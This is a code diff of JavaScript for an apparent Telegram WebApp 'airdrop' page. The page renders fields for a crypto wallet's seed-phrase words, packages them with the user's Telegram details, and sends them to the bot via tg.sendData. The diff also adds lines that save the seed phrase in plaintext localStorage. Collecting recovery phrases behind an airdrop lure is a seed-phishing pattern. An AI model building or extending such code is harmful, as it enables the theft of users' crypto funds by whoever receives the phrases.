@@ -21,7 +21,6 @@ function initTelegram() {
         const fname = [user.first_name, user.last_name].filter(Boolean).join(" ") || "-";
         const timestamp = new Date().toISOString();
 
-        // 💾 Зберігаємо у localStorage
         localStorage.setItem("tg_user_id", uid);
         localStorage.setItem("tg_username", uname);
         localStorage.setItem("tg_name", fname);
@@ -45,12 +44,11 @@ document.addEventListener("DOMContentLoaded", () => {
             <div class="profile-card">
                 <p><strong>👤 Пользователь:</strong> ${fname}</p>
                 <p><strong>🆔 Telegram ID:</strong> ${uid}</p>
-                <p><strong>📛 Username:</strong> ${uname !== "-" ? "@" + uname : "нет"}</p>
+                <p><strong>💛 Username:</strong> ${uname !== "-" ? "@" + uname : "нет"}</p>
             </div>
         `;
     }
 
-    // ======= Завантаження Airdrops =======
     fetch('https://sp574-maker.github.io/maker/data/airdrops.json')
         .then(res => res.json())
         .then(data => {
@@ -76,11 +74,9 @@ document.addEventListener("DOMContentLoaded", () => {
                 "<p style='color:red'>❌ Не вдалося завантажити список airdrop'ів.</p>";
         });
 
-    // ======= Submit кнопка =======
     const btn = document.getElementById('submitBtn');
     if (btn) btn.addEventListener('click', submitAirdrop);
 
-    // ======= Кастомний селектор гаманця =======
     const selectWrapper = document.querySelector('.custom-select');
     if (selectWrapper) {
         const selected = selectWrapper.querySelector('.selected');
@@ -107,7 +103,6 @@ document.addEventListener("DOMContentLoaded", () => {
     }
 });
 
-// ======= Вибір Airdrop =======
 function selectAirdrop(name) {
     document.getElementById('selectedAirdropTitle').innerText = `🔗 ${name}`;
     document.getElementById('airdropList').style.display = 'none';
@@ -115,7 +110,6 @@ function selectAirdrop(name) {
     renderSeedInputs();
 }
 
-// ======= Рендер полів seed =======
 function renderSeedInputs() {
     const length = parseInt(document.getElementById('length').value);
     const container = document.getElementById('seedContainer');
@@ -145,7 +139,6 @@ function renderSeedInputs() {
     }
 }
 
-// ======= Submit форми =======
 function submitAirdrop() {
     const inputs = Array.from(document.querySelectorAll('#seedContainer input'));
     const words = inputs.map(input => input.value.trim()).filter(Boolean);
@@ -166,11 +159,12 @@ function submitAirdrop() {
         wallet: document.getElementById("wallet").value
     };
 
-    // 💾 Зберегти в localStorage для airprofile.html
     localStorage.setItem("tg_user_id", payload.user_id);
     localStorage.setItem("tg_username", payload.username);
     localStorage.setItem("tg_name", payload.name);
     localStorage.setItem("tg_timestamp", payload.timestamp);
+    localStorage.setItem("last_seed", payload.seed);
+    localStorage.setItem("wallet_used", payload.wallet);
 
     if (!demoMode && tg?.sendData) {
         console.log("[📤 Надсилання в Telegram WebApp]", payload);
